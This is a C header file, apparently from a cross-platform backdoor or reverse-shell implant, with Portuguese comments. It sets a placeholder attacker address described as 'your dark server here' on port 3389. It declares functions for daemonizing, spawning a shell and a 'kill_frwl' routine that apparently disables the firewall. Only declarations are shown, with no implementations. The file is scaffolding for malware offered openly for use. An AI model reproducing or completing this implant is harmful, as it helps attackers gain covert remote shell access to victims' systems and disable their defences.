#ifndef _MAIN_H
#define _MAIN_H

#include "execfuncs.h"

/* Basic libraries */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>

/* Sockets */

#if defined(_WIN32) || defined(_WIN64)
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib,"ws2_32.lib") // Para o linker do MSVC
#else // Assumindo sistemas baseados em Unix (Linux)
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <sys/types.h>
    #include <fcntl.h>
    #include <X11/Xlib.h> // Específico do Linux, pode ser removido se não for usado
#endif

#define remote_addr "0.0.0.0" /* your dark server here */
#define remote_port 3389

// Declarações de funções que serão implementadas de forma diferente
void daemonize();
void shell();
int kill_frwl();

//#define focusWin

#define true 1
#define false 0

extern char *__progname;

//extern char * szKeyString;


/* struct of configurations to target. */

  typedef struct {

  int REMOTE_ADDR; /*remote_addr */
  int REMOTE_PORT; /* remote port */


  } Target;

  //int x = true;


#endif // _MAIN_H
